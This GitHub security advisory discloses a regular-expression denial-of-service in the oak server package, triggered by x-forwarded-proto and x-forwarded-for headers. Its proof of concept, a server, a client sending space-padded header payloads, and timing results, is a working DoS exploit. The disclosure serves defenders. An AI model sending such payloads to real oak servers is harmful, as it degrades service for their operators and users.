# [M] Oak Server has ReDoS in x-forwarded-proto and x-forwarded-for headers

## Summary
Severity: Medium
Advisory: GHSA-r3v7-pc4g-7xp9
CVE: CVE-2025-55152
CWE: CWE-400
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2025-08-12
Source: https://github.com/advisories/GHSA-r3v7-pc4g-7xp9
Type: github-advisory

## Affected
- npm: `@oakserver/oak` — affected >=0

## Details
### Summary

With specially crafted value of the `x-forwarded-proto` or `x-forwarded-for` headers, it's possible to significantly slow down an oak server.

### Vulnerable Code

- https://github.com/oakserver/oak/blob/v17.1.5/request.ts#L87
- https://github.com/oakserver/oak/blob/v17.1.5/request.ts#L142

### PoC

- setup
```
deno --version
deno 2.4.3
v8 13.7.152.14-rusty
typescript 5.8.3
```

- `server.ts`
```ts
import { Application } from "https://deno.land/x/oak/mod.ts";

const app = new Application({proxy: true});

let i = 1

app.use((ctx) => {

    // let url = ctx.request.url   // test1) x-forwarded-proto
    let ips = ctx.request.ips   // test2) x-forwarded-for
    console.log(`request ${i} received`)
    i++;
    ctx.response.body = "hello";
});

await app.listen({ port: 8080 });
```

- `client.ts`
```ts
const lengths = [2000, 4000, 8000, 16000, 32000, 64000, 128000]

const data1 = lengths.map(l => 'A' + 'A'.repeat(l) + 'A');
const data2 = lengths.map(l => 'A' + ' '.repeat(l) + 'A');

async function run(data) {
    for (let i = 0; i < data.length; i++) {
        let d = data[i];
        
        const start = performance.now();

        await fetch("http://localhost:8080", {
            headers: {
                // "x-forwarded-proto": d,  // test1)
                "x-forwarded-for": d,    // test2)
            },
        });

        const end = performance.now();
        console.log('length=%d, time=%d ms', d.length, end - start);
    }
}

console.log("\n[+] Test normal behavior")
await run(data1)
console.log("\n[+] Test payloads")
await run(data2)
```

- run
```
deno run --allow-net server.ts
deno run --allow-net client.ts

[+] Test normal behavior
length=2002, time=14 ms
length=4002, time=6 ms
length=8002, time=3 ms
length=16002, time=3 ms
length=32002, time=2 ms
length=64002, time=4 ms
length=128002, time=3 ms

[+] Test payloads
length=2002, time=7 ms
length=4002, time=22 ms
length=8002, time=77 ms
length=16002, time=241 ms
length=32002, time=947 ms
length=64002, time=4020 ms
length=128002, time=15840 ms
```


### Impact

A specially crafted value of the `x-forwarded-proto` or `x-forwarded-for` headers  can be used to significantly slow down an oak server.

### Similar Issues

- https://github.com/denoland/deno/security/advisories/GHSA-jc97-h3h9-7xh6
	- https://github.com/denoland/deno/pull/17722
- https://github.com/websockets/ws/security/advisories/GHSA-6fc8-4gx4-v693
	- https://github.com/websockets/ws/commit/00c425ec77993773d823f018f64a5c44e17023ff

## References
- https://github.com/oakserver/oak/security/advisories/GHSA-r3v7-pc4g-7xp9
- https://nvd.nist.gov/vuln/detail/CVE-2025-55152
- https://github.com/oakserver/oak/commit/b60e60330ef227707c4dc13ef0ea36192d894f44
- https://github.com/oakserver/oak
- https://github.com/oakserver/oak/blob/v17.1.5/request.ts#L142
- https://github.com/oakserver/oak/blob/v17.1.5/request.ts#L87
